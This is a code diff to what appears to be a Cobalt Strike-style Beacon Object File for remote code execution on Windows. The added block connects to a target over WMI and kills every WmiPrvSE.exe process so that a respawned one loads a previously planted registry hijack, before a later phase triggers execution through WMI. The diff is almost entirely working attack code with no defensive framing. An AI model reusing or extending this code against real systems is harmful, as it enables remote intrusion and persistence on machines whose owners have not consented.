@@ -602,6 +602,62 @@ extern "C" void go(char *args, int alen) {
         return;
     }
 
+    /* ---- Phase 2.5: Kill wmiprvse so a fresh one picks up the hijack ---- */
+    /* Provider cache is per-process. Stale wmiprvse won't read new registry. */
+    {
+        IWbemServices *pSvcKill = wmi_connect(target, L"ROOT\\CIMV2");
+        if (pSvcKill) {
+            BSTR bstrWQL = OLEAUT32$SysAllocString(L"WQL");
+            BSTR bstrQ = OLEAUT32$SysAllocString(L"SELECT Handle FROM Win32_Process WHERE Name='WmiPrvSE.exe'");
+            IEnumWbemClassObject *pEnum = NULL;
+            HRESULT hrk = pSvcKill->ExecQuery(bstrWQL, bstrQ,
+                WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &pEnum);
+            OLEAUT32$SysFreeString(bstrWQL);
+            OLEAUT32$SysFreeString(bstrQ);
+
+            if (SUCCEEDED(hrk) && pEnum) {
+                IWbemClassObject *pProc = NULL;
+                ULONG ret = 0;
+                while (pEnum->Next(5000, 1, &pProc, &ret) == S_OK && ret > 0) {
+                    BSTR bstrTerm = OLEAUT32$SysAllocString(L"Terminate");
+                    IWbemClassObject *pInDef = NULL, *pInInst = NULL;
+                    IWbemClassObject *pCls = NULL;
+                    BSTR bstrCls = OLEAUT32$SysAllocString(L"Win32_Process");
+                    pSvcKill->GetObject(bstrCls, 0, NULL, &pCls, NULL);
+                    if (pCls) {
+                        pCls->GetMethod(bstrTerm, 0, &pInDef, NULL);
+                        if (pInDef) {
+                            pInDef->SpawnInstance(0, &pInInst);
+                            if (pInInst) {
+                                VARIANT vReason;
+                                vReason.vt = VT_I4; vReason.lVal = 0;
+                                pInInst->Put(L"Reason", 0, &vReason, 0);
+                                /* Get __PATH for this instance */
+                                VARIANT vPath;
+                                pProc->Get(L"__PATH", 0, &vPath, NULL, NULL);
+                                if (vPath.vt == VT_BSTR) {
+                                    pSvcKill->ExecMethod(vPath.bstrVal, bstrTerm, 0, NULL, pInInst, NULL, NULL);
+                                    OLEAUT32$SysFreeString(vPath.bstrVal);
+                                }
+                                pInInst->Release();
+                            }
+                            pInDef->Release();
+                        }
+                        pCls->Release();
+                    }
+                    OLEAUT32$SysFreeString(bstrCls);
+                    OLEAUT32$SysFreeString(bstrTerm);
+                    pProc->Release();
+                    ret = 0;
+                }
+                pEnum->Release();
+            }
+            pSvcKill->Release();
+            TMB_INFO("Killed wmiprvse.exe (cache flush)");
+            KERNEL32$Sleep(2000); /* wait for WMI to respawn fresh wmiprvse */
+        }
+    }
+
     /* ---- Phase 3: Trigger via WMI ---- */
     KERNEL32$Sleep(500);
 
